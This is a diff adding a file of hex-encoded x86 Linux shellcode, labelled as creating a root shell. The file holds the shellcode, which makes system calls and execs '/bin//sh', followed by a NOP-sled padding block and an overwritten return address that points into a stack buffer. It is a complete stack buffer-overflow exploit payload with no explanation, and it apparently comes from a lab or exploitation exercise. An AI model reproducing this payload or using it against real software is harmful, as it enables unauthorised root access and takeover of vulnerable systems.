@@ -1,0 +1,39 @@
+# 128-byte shellcode: creat a root shell
+ b8 6c 6c 3a
+ 0a 50 b8 20
+ 73 68 65 50
+ b8 72 6f 6f
+ 74 50 ba fc
+ ff ff ff 83
+ f2 f0 89 e1
+ bb f1 ff ff
+ ff 83 f3 f0
+ b8 f4 ff ff
+ ff 83 f0 f0
+ cd 80 31 db
+ b8 07 ff ff
+ ff 35 10 ff
+ ff ff cd 80
+ 31 c0 50 68
+ 6e 2f 73 68
+ 68 2f 2f 62
+ 69 89 e3 89
+ c1 89 c2 b8
+ fb ff ff ff
+ 83 f0 f0 cd
+ 80 31 db b8
+ f1 ff ff ff
+ 83 f0 f0 cd
+ 80 90 90 90
+ 90 90 90 90
+ 90 90 90 90
+ 90 90 90 90
+ 90 90 90 90
+ 90 90 90 90
+ 90 90 90 90
+# 12-byte
+ 90 90 90 90
+ 90 90 90 90
+ 90 90 90 90
+# modify return address to &(buf[0])
+ c0 52 84 bf
